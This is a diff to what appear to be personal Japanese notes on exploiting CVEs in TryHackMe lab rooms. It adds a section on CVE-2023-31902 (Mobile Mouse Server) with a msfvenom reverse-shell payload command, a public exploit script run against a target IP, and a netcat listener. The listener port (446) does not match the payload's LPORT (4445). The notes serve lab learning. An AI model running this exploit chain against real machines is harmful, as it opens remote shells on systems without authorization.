@@ -452,6 +452,26 @@ https://tryhackme.com/room/cve202338408
 - ターゲットが SSH 接続するとき、接続先のマシンが制御化にあることが必要。
 - THM の説明は環境構築に関して不明瞭な点が多く、CTF 等での再現は難しい。
 
+## CVE-2023-31902 (Mobile Mouse Server)
+
+https://github.com/blue0x1/mobilemouse-exploit
+
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.110.232 LPORT=4445 -f exe > shell.exe
+```
+
+```sh
+git clone https://github.com/blue0x1/mobilemouse-exploit
+cd mobilemouse-exploit
+
+python ./CVE-2023-31902-v2.py --target 10.201.71.200 --file shell.exe --lhost 10.201.110.232
+```
+
+```sh
+sudo nc -lnvp 446
+```
+
+
 ## CVE-2023-23397 (Outlook NTLM Leak)
 
 https://tryhackme.com/room/outlookntlmleak
